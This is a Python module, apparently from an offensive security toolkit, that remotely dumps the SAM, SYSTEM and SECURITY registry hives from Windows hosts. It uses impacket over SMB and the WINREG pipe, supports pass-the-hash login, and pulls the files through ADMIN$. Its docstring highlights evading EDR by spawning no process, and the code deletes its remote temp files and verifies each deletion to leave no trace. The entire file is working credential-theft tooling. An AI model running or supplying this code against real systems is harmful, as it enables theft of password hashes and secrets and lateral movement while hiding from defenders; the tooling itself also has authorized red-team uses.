"""Remote hive dump machinery shared by the registry-reading modules
(sam_dump, dpapi_system).

reg save via the WINREG pipe (BaseRegSaveKey) — no process spawned, no
bat files, no EDR-shaped exec at all; hives download over ADMIN$ into
memory with the remote temp file deleted and the deletion verified.
impacket imports are FUNCTION-LOCAL so core stays importable on a bare
stdlib interpreter.
"""

import random
import string
import tempfile
from pathlib import Path

HIVES = {
    "SAM": r"SAM",
    "SYSTEM": r"System",
    "SECURITY": r"Security",
}


def rand_tmp(prefix):
    return f"fz_{prefix}_" + "".join(random.choice(string.ascii_lowercase)
                                    for _ in range(6)) + ".tmp"


def smb_login(host, port, user, password, domain=".", nthash=""):
    from impacket.smbconnection import SMBConnection
    conn = SMBConnection(host, host, sess_port=int(port), timeout=20)
    if nthash:
        conn.login(user, "", domain or ".", "", nthash)
    else:
        conn.login(user, password, domain or ".")
    return conn


def rrp_bind(conn, host):
    from impacket.dcerpc.v5 import rrp, transport
    rpctrans = transport.SMBTransport(host, filename=r"\winreg",
                                      smb_connection=conn)
    dce = rpctrans.get_dce_rpc()
    dce.connect()
    dce.bind(rrp.MSRPC_UUID_RRP)
    return dce


def save_hive(dce, hive, remote_path):
    from impacket.dcerpc.v5 import rrp
    resp = rrp.hOpenLocalMachine(dce)
    root = resp["phKey"]
    resp = rrp.hBaseRegOpenKey(dce, root, HIVES[hive])
    key_handle = resp["phkResult"]
    try:
        rrp.hBaseRegSaveKey(dce, key_handle, remote_path)
    finally:
        rrp.hBaseRegCloseKey(dce, key_handle)
        rrp.hBaseRegCloseKey(dce, root)


def read_and_clean(conn, share_path):
    """Hive bytes out of ADMIN$, the remote file deleted and the delete
    PROVEN (the re-read must fail). Returns (data, survived) — survived
    True means the file refused to die and needs a manual cleanup."""
    buf = []
    conn.getFile("ADMIN$", share_path, buf.append)
    data = b"".join(buf)
    survived = False
    try:
        conn.deleteFile("ADMIN$", share_path)
        conn.getFile("ADMIN$", share_path, lambda x: x)  # must fail now
        survived = True
    except Exception:
        pass  # the failed re-read is the proof it's gone
    return data, survived


def pull_hives(conn, dce, names, warn=None):
    """Save + download each named hive (SeBackupPrivilege required);
    remote temp files cleaned with verification. Returns
    {hive: bytes}; warn(message) gets per-hive failures and survives."""
    hives = {}
    cleanup = []
    try:
        for hive in names:
            tmp = rand_tmp(hive.lower())
            remote = f"C:\\Windows\\Temp\\{tmp}"
            share_path = f"Temp\\{tmp}"
            try:
                save_hive(dce, hive, remote)
            except Exception as e:
                if warn:
                    warn(f"reg save {hive} failed (SeBackupPrivilege "
                         f"required) - {e}")
                continue
            cleanup.append(share_path)
            try:
                data, survived = read_and_clean(conn, share_path)
                if survived and warn:
                    warn(f"{share_path} survived delete — remove it "
                         f"manually")
                hives[hive] = data
            except Exception as e:
                if warn:
                    warn(f"reading {hive} failed - {e}")
    finally:
        for share_path in cleanup:
            try:
                conn.deleteFile("ADMIN$", share_path)
            except Exception:
                pass
    return hives


def stage_hives(hives):
    """impacket's registry parsers work on PATHS, not bytes — stage
    hives into temp files. Returns {hive: path}; caller unlinks."""
    staging = {}
    for hive, data in hives.items():
        fd, path = tempfile.mkstemp(prefix=f"forge_{hive.lower()}_")
        with open(fd, "wb") as f:
            f.write(data)
        staging[hive] = path
    return staging


def unstage(staging):
    for path in staging.values():
        Path(path).unlink(missing_ok=True)
